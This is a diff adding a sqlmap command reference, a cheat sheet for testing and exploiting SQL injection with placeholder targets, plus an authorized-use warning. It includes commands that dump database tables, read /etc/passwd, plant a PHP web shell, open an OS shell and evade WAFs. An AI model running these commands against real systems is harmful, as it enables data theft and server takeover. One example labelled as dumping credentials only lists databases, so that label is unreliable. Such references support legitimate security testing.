@@ -1,0 +1,124 @@
+=============================================
+  SQLMap Commands Reference
+  Author: Sifuna Codex
+=============================================
+
+SQLMap is an automated SQL injection detection and exploitation tool.
+
+INSTALLATION
+============
+# Via apt
+sudo apt-get install sqlmap -y
+
+# Via git
+git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
+cd sqlmap
+python sqlmap.py
+
+
+BASIC USAGE
+===========
+# Test a URL parameter
+sqlmap -u "http://target.com/product?id=1"
+
+# Test with POST data
+sqlmap -u "http://target.com/login" --data="username=admin&password=test"
+
+# Test with cookies
+sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123"
+
+
+DATABASE ENUMERATION
+====================
+# List all databases
+sqlmap -u "http://target.com/product?id=1" --dbs
+
+# List tables in a database
+sqlmap -u "http://target.com/product?id=1" -D database_name --tables
+
+# List columns in a table
+sqlmap -u "http://target.com/product?id=1" -D database_name -T table_name --columns
+
+# Dump table contents
+sqlmap -u "http://target.com/product?id=1" -D database_name -T table_name --dump
+
+
+ADVANCED OPTIONS
+================
+# Specify injection technique
+sqlmap -u "http://target.com/product?id=1" --technique=BEU
+
+# B: Boolean-based blind
+# E: Error-based
+# U: Union query-based
+# S: Stacked queries
+# T: Time-based blind
+
+# Set risk and level
+sqlmap -u "http://target.com/product?id=1" --risk=3 --level=5
+
+# Bypass WAF/IPS
+sqlmap -u "http://target.com/product?id=1" --tamper=space2comment
+
+# Use a specific tamper script
+sqlmap -u "http://target.com/product?id=1" --tamper=between,randomcase
+
+
+FILE OPERATIONS
+===============
+# Read a file from the server
+sqlmap -u "http://target.com/product?id=1" --file-read="/etc/passwd"
+
+# Write a file to the server
+sqlmap -u "http://target.com/product?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
+
+# Access OS shell (if permissions allow)
+sqlmap -u "http://target.com/product?id=1" --os-shell
+
+
+SESSION MANAGEMENT
+==================
+# Use a session file
+sqlmap -u "http://target.com/product?id=1" --session=session.sqlite
+
+# Flush session (start fresh)
+sqlmap --flush-session
+
+# Resume from session
+sqlmap -u "http://target.com/product?id=1" --resume
+
+
+OUTPUT OPTIONS
+==============
+# Verbose output
+sqlmap -u "http://target.com/product?id=1" -v 3
+
+# Save output to file
+sqlmap -u "http://target.com/product?id=1" --output-dir=./results
+
+# Be quiet
+sqlmap -u "http://target.com/product?id=1" --batch
+
+
+EXAMPLE COMMANDS
+================
+# Basic SQLi test
+sqlmap -u "http://localhost/product?id=1" --batch
+
+# Dump user credentials
+sqlmap -u "http://localhost/login" --data="user=admin&pass=test" \
+  --dbs --batch
+
+# Get OS shell
+sqlmap -u "http://localhost/product?id=1" --os-shell --batch
+
+# Bypass WAF and dump
+sqlmap -u "http://localhost/product?id=1" \
+  --tamper=space2comment,between \
+  --level=5 --risk=3 --batch
+
+
+=============================================
+  IMPORTANT: Only use on authorized targets!
+  Unauthorized access is illegal.
+=============================================
